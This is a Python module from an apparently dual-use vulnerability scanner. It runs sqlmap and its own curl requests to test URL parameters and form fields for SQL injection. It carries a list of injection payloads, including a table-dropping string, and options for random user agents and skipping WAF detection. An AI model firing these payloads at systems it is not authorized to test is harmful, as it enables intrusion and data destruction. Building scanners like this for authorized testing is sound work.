#!/usr/bin/env python3
"""
SQL Injection Testing Module
Orchestrates sqlmap for automated SQL injection testing
"""

import asyncio
import json
import logging
import random
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, parse_qs

from .utils import RateLimiter, sanitize_filename

logger = logging.getLogger(__name__)


class SQLInjectionTester:
    """
    SQL injection testing using sqlmap
    """
    
    def __init__(self, config):
        """
        Initialize SQL injection tester
        
        Args:
            config: Configuration manager instance
        """
        self.config = config
        delay = self.config.get('sqlmap.delay', 2)
        # If delay is 0, rate is unlimited (infinite requests per second).
        # Otherwise, requests_per_second is 1/delay.
        requests_per_second = float('inf') if delay <= 0 else 1.0 / delay
        self.rate_limiter = RateLimiter(
            requests_per_second=requests_per_second
        )
        self.owasp_category = "A03:2021 – Injection"
        self.quick_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]
    
    async def test_targets(self, targets: List, progress=None, task_id=None) -> List[Dict]:
        """
        Test multiple targets for SQL injection vulnerabilities
        
        Args:
            targets: List of URLs or URL info dictionaries to test
            progress: Optional progress tracker
            task_id: Optional task ID for progress updates
            
        Returns:
            List of test results
        """
        results = []
        total_targets = len(targets)
        
        logger.info(f"Starting SQL injection testing on {total_targets} targets")
        
        for i, target in enumerate(targets):
            try:
                await self.rate_limiter.wait_if_needed()
                
                if progress and task_id:
                    progress.update(task_id, advance=1, 
                                  description=f"Testing target {i+1}/{total_targets}")
                
                result = await self._test_single_target(target)
                results.append(result)
                
                if result.get('vulnerable', False):
                    logger.warning(f"SQL injection vulnerability found: {result['url']}")
                
            except Exception as e:
                logger.error(f"Error testing target {target}: {str(e)}")
                results.append({
                    'url': str(target),
                    'vulnerable': False,
                    'error': str(e),
                    'timestamp': self._get_timestamp()
                })
        
        logger.info(f"SQL injection testing completed. Found {len([r for r in results if r.get('vulnerable', False)])} vulnerabilities")
        
        return results
    
    async def _test_single_target(self, target) -> Dict:
        """
        Test a single target for SQL injection
        
        Args:
            target: URL string or form info dictionary
            
        Returns:
            Test result dictionary
        """
        # Check if this is a form (has action key)
        if isinstance(target, dict) and 'action' in target:
            return await self._test_form(target)
        
        # Existing URL testing code
        if isinstance(target, dict):
            url = target['url']
            interesting_params = target.get('sql_params', [])
        else:
            url = str(target)
            interesting_params = []
        
        logger.debug(f"Testing SQL injection on: {url}")
        
        result = {
            'url': url,
            'vulnerable': False,
            'vulnerability_type': None,
            'vulnerable_parameters': [],
            'payloads': [],
            'details': {},
            'severity': 'info',
            'owasp_category': self.owasp_category,
            'timestamp': self._get_timestamp(),
            'tool': 'sqlmap'
        }
        
        try:
            if interesting_params:
                quick_result = await self._quick_parameter_test(url, interesting_params)
                if quick_result['vulnerable']:
                    result.update(quick_result)
                    result['severity'] = 'high'
                    return result
            
            sqlmap_result = await self._run_sqlmap(url, interesting_params)
            
            if sqlmap_result['vulnerable']:
                result.update(sqlmap_result)
                result['severity'] = self._determine_severity(sqlmap_result)
            
        except Exception as e:
            logger.error(f"Error in SQL injection testing for {url}: {str(e)}")
            result['error'] = str(e)
        
        return result
    
    async def _quick_parameter_test(self, url: str, params: List[str]) -> Dict:
        """
        Quick SQL injection test on specific parameters
        
        Args:
            url: Target URL
            params: List of parameter names to test
            
        Returns:
            Quick test result
        """
        result = {
            'vulnerable': False,
            'vulnerability_type': 'quick_test',
            'vulnerable_parameters': [],
            'payloads': [],
            'method': 'parameter_manipulation'
        }
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param in params:
            if param in query_params:
                for payload in self.quick_payloads[:3]:
                    test_result = await self._test_parameter_payload(url, param, payload)
                    
                    if test_result['vulnerable']:
                        result['vulnerable'] = True
                        result['vulnerable_parameters'].append(param)
                        result['payloads'].append({
                            'parameter': param,
                            'payload': payload,
                            'response_indicators': test_result.get('indicators', [])
                        })
        
        return result
    
    async def _test_parameter_payload(self, url: str, param: str, payload: str) -> Dict:
        """
        Test a specific parameter with a payload
        
        Args:
            url: Target URL
            param: Parameter name
            payload: SQL injection payload
            
        Returns:
            Test result
        """
        try:
            from urllib.parse import urlencode, urlunparse
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, new_query, parsed_url.fragment
            ))
            
            user_agent = random.choice(self.config.get('general.user_agents', ['SQLMap-Scanner']))
            cmd = ['curl', '-s', '-L', '--max-time', '10', '--user-agent', user_agent, test_url]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            response = stdout.decode(errors='ignore')
            
            sql_errors = [
                'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                'ORA-01756', 'Microsoft OLE DB Provider',
                'ODBC Microsoft Access Driver', 'JDBC',
                'SQLite error', 'PostgreSQL query failed',
                'Warning: mysql_', 'valid MySQL result',
                'Unclosed quotation mark', 'Incorrect syntax near'
            ]
            
            indicators = [error for error in sql_errors if error.lower() in response.lower()]
            
            return {
                'vulnerable': len(indicators) > 0,
                'indicators': indicators,
                'response_length': len(response)
            }
        
        except Exception as e:
            logger.debug(f"Error testing parameter {param} with payload {payload}: {str(e)}")
            return {'vulnerable': False}
    
    async def _run_sqlmap(self, url: str, focus_params: List[str] = None) -> Dict:
        """
        Run sqlmap against the target URL
        
        Args:
            url: Target URL
            focus_params: Optional list of parameters to focus on
            
        Returns:
            Sqlmap test results
        """
        result = { 'vulnerable': False }
        
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            cmd = self._build_sqlmap_command(url, temp_path, focus_params)
            
            logger.debug(f"Running sqlmap: {' '.join(cmd)}")
            
            try:
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=temp_dir
                )
                
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=self.config.get('sqlmap.timeout', 300)
                )
                
                # Check for output files and parse them
                if (temp_path / "log").exists():
                    result = self._parse_sqlmap_output(temp_path)
                else:
                    result = self._parse_sqlmap_text_output(stdout.decode(), stderr.decode())
                
            except asyncio.TimeoutError:
                logger.warning(f"Sqlmap timeout for URL: {url}")
                result['error'] = 'timeout'
            except FileNotFoundError:
                logger.error("Sqlmap not found. Please install sqlmap.")
                result['error'] = 'sqlmap_not_found'
            except Exception as e:
                logger.error(f"Error running sqlmap: {str(e)}")
                result['error'] = str(e)
        
        return result
    
    def _build_sqlmap_command(self, url: str, output_dir: Path, focus_params: List[str] = None) -> List[str]:
        """
        Build sqlmap command with appropriate options
        
        Args:
            url: Target URL
            output_dir: Output directory path
            focus_params: Parameters to focus testing on
            
        Returns:
            Command list for subprocess
        """
        cmd = ['sqlmap']
        
        cmd.extend(['-u', url])
        cmd.extend(['--level', str(self.config.get('sqlmap.level', 1))])
        cmd.extend(['--risk', str(self.config.get('sqlmap.risk', 1))])
        cmd.extend(['--timeout', str(self.config.get('sqlmap.timeout', 30))])
        cmd.extend(['--retries', str(self.config.get('sqlmap.retries', 3))])
        cmd.extend(['--threads', str(self.config.get('sqlmap.threads', 5))])
        cmd.extend(['--technique', self.config.get('sqlmap.technique', 'BEUSTQ')])
        
        if self.config.get('sqlmap.batch', True):
            cmd.append('--batch')
        
        if self.config.get('sqlmap.random_agent', True):
            cmd.append('--random-agent')
        
        if focus_params:
            cmd.extend(['-p', ','.join(focus_params)])
        
        cmd.extend(['--output-dir', str(output_dir)])
        
        if not self.config.get('sqlmap.detect_waf', False):
            cmd.append('--skip-waf')
        
        delay = self.config.get('sqlmap.delay', 0)
        if delay > 0:
            cmd.extend(['--delay', str(delay)])
        
        cmd.extend(['--disable-coloring', '--no-cast', '--no-escape'])
        
        return cmd
    
    def _parse_sqlmap_output(self, output_dir: Path) -> Dict:
        """
        Parse sqlmap output directory
        
        Args:
            output_dir: Path to sqlmap output directory
            
        Returns:
            Parsed results dictionary
        """
        result = { 'vulnerable': False, 'details': {} }
        
        try:
            log_file = output_dir / "log"
            if log_file.exists():
                log_content = log_file.read_text()
                # A simple way to check for success is to look for the "resumed" line
                if "resumed" in log_content:
                    result['vulnerable'] = True
            
            # Additional parsing logic for session files can be added here if needed
            
        except Exception as e:
            logger.debug(f"Error parsing sqlmap output: {str(e)}")
        
        return result

    def _parse_sqlmap_text_output(self, stdout: str, stderr: str) -> Dict:
        """
        Parse sqlmap text output when JSON is not available
        
        Args:
            stdout: Standard output from sqlmap
            stderr: Standard error from sqlmap
            
        Returns:
            Parsed results dictionary
        """
        result = {
            'vulnerable': False,
            'vulnerability_type': 'sqlmap_text',
            'vulnerable_parameters': [],
            'details': {},
            'raw_output': stdout + stderr
        }
        
        output = stdout + stderr
        
        vulnerability_indicators = [
            'parameter appears to be vulnerable',
            'parameter is vulnerable',
            'payload used:',
            'Type: boolean-based blind',
            'Type: time-based blind',
            'Type: error-based',
            'Type: UNION query',
            'Type: stacked queries'
        ]
        
        if any(indicator.lower() in output.lower() for indicator in vulnerability_indicators):
            result['vulnerable'] = True
        
        param_matches = re.findall(r"Parameter: ([^\s]+) \(", output)
        if param_matches:
            result['vulnerable_parameters'] = list(set(param_matches))
        
        return result
    
    def _determine_severity(self, test_result: Dict) -> str:
        """
        Determine severity level based on test results
        
        Args:
            test_result: SQL injection test results
            
        Returns:
            Severity level (low, medium, high, critical)
        """
        if not test_result.get('vulnerable', False):
            return 'info'
        
        critical_factors = [
            'DROP' in str(test_result.get('details', {})),
            'admin' in str(test_result.get('details', {})).lower(),
            'password' in str(test_result.get('details', {})).lower()
        ]
        
        high_factors = [
            'UNION query' in str(test_result.get('technique', '')),
            'stacked queries' in str(test_result.get('technique', '')),
            test_result.get('database') is not None,
            len(test_result.get('vulnerable_parameters', [])) > 1
        ]
        
        if any(critical_factors):
            return 'critical'
        elif any(high_factors):
            return 'high'
        elif test_result.get('vulnerable_parameters'):
            return 'medium'
        else:
            return 'low'
    
    def _get_timestamp(self) -> str:
        """Get current timestamp in ISO format"""
        from datetime import datetime
        return datetime.now().isoformat()
    
    async def _test_form(self, form_info: Dict) -> Dict:
        """
        Test a form for SQL injection vulnerabilities
        
        Args:
            form_info: Form information dictionary
            
        Returns:
            Test result dictionary
        """
        result = {
            'url': form_info['action'],
            'vulnerable': False,
            'vulnerability_type': None,
            'vulnerable_parameters': [],
            'payloads': [],
            'details': {},
            'severity': 'info',
            'owasp_category': self.owasp_category,
            'timestamp': self._get_timestamp(),
            'tool': 'custom_form_tester',
            'method': form_info.get('method', 'GET')
        }
        
        try:
            # Test each input field
            for input_field in form_info.get('inputs', []):
                field_name = input_field.get('name')
                if not field_name:
                    continue
                    
                # Test with basic payloads
                for payload in self.quick_payloads[:3]:
                    test_result = await self._test_form_field(
                        form_info['action'], 
                        form_info.get('method', 'POST'),
                        form_info.get('inputs', []),
                        field_name,
                        payload
                    )
                    
                    if test_result['vulnerable']:
                        result['vulnerable'] = True
                        result['vulnerable_parameters'].append(field_name)
                        result['payloads'].append({
                            'parameter': field_name,
                            'payload': payload,
                            'response_indicators': test_result.get('indicators', [])
                        })
                        result['severity'] = 'high'
            
        except Exception as e:
            logger.error(f"Error testing form {form_info['action']}: {str(e)}")
            result['error'] = str(e)
        
        return result

    async def _test_form_field(self, action: str, method: str, inputs: List[Dict], 
                            field_name: str, payload: str) -> Dict:
        """
        Test a specific form field with a payload
        
        Args:
            action: Form action URL
            method: HTTP method (GET/POST)
            inputs: List of form inputs
            field_name: Field name to test
            payload: SQL injection payload
            
        Returns:
            Test result
        """
        try:
            # Prepare form data
            form_data = {}
            for input_field in inputs:
                name = input_field.get('name')
                if name:
                    # Use payload for the target field, default values for others
                    form_data[name] = payload if name == field_name else input_field.get('value', '')
            
            # Build curl command
            cmd = ['curl', '-s', '-L', '--max-time', '10']
            
            if method.upper() == 'POST':
                cmd.extend(['-X', 'POST'])
                # URL-encode form data
                form_data_str = '&'.join([f"{k}={v}" for k, v in form_data.items()])
                cmd.extend(['-d', form_data_str])
            else:
                # For GET, append to URL
                action += '?' + '&'.join([f"{k}={v}" for k, v in form_data.items()])
            
            cmd.extend(['--user-agent', random.choice(self.config.get('general.user_agents', ['SQLMap-Scanner']))])
            cmd.append(action)
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            response = stdout.decode(errors='ignore')
            
            # Check for SQL errors
            sql_errors = [
                'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                'ORA-01756', 'Microsoft OLE DB Provider',
                'ODBC Microsoft Access Driver', 'JDBC',
                'SQLite error', 'PostgreSQL query failed',
                'Warning: mysql_', 'valid MySQL result',
                'Unclosed quotation mark', 'Incorrect syntax near'
            ]
            
            indicators = [error for error in sql_errors if error.lower() in response.lower()]
            
            return {
                'vulnerable': len(indicators) > 0,
                'indicators': indicators,
                'response_length': len(response)
            }
        
        except Exception as e:
            logger.debug(f"Error testing form field {field_name}: {str(e)}")
            return {'vulnerable': False}